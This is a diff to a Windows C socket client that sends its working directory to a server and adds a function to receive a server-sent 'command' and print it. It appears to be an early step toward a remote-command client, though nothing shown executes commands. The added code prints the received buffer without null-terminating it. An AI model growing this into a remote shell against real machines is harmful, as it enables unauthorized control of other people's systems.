@@ -9,6 +9,7 @@ SOCKET startSocket();
 void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
 void closeSocket(SOCKET client_socket);
 void sendMsg(SOCKET client_socket, const char *msg);
+void receiveCommand(SOCKET client_socket, char *rsp);
 
 int main(){
     
@@ -27,6 +28,8 @@ int main(){
     
     getcwd(cwd, 1024);
     sendMsg(client_socket, cwd);
+    receiveCommand(client_socket, cmd_buff);
+    printf("%s", cmd_buff);
 
     return 1;
 }
@@ -82,4 +85,11 @@ void sendMsg(SOCKET client_socket, const char *msg) {
 void closeSocket(SOCKET client_socket) {
     closesocket(client_socket);
     WSACleanup();
+}
+
+void receiveCommand(SOCKET client_socket, char *rsp){
+    int received = recv(client_socket, rsp, 1024, 0);
+    if (received < 1){
+        printf("Error receiving message.\n");
+    }
 }
